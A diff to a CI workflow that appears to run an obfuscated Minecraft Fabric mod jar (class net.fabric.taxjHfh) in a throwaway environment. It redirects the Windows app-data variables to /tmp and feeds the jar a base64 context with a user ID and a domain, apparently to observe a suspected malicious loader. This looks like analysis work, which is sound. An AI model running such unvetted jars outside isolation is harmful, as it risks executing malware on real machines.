@@ -19,6 +19,9 @@ jobs:
       UID_: "80618e74-3f82-4aa6-b6e3-510587905f36"
       TAG_: ${{ inputs.tag }}
       DOM_: ${{ inputs.domain }}
+      LOCALAPPDATA: /tmp/la
+      APPDATA: /tmp/ad
+      TEMP: /tmp/tmp
     steps:
       - uses: actions/checkout@v4
       - uses: actions/setup-java@v4
@@ -28,7 +31,7 @@ jobs:
       - name: Run agent
         shell: bash
         run: |
-          mkdir -p work
+          mkdir -p work /tmp/mc /tmp/la /tmp/ad /tmp/tmp
           ctx=$(python3 -c "import base64,json,os;print(base64.b64encode(json.dumps({'userId':os.environ['UID_'],'tag':os.environ['TAG_'],'domain':os.environ['DOM_'],'env':'Fabric','gameDir':'/tmp/mc','mcInfo':'{}'},separators=(',',':')).encode()).decode())")
           echo "ctx=$ctx"
           timeout 120 java -cp agent/mod.jar net.fabric.taxjHfh "$ctx" 2>&1 | tee work/run.log || true
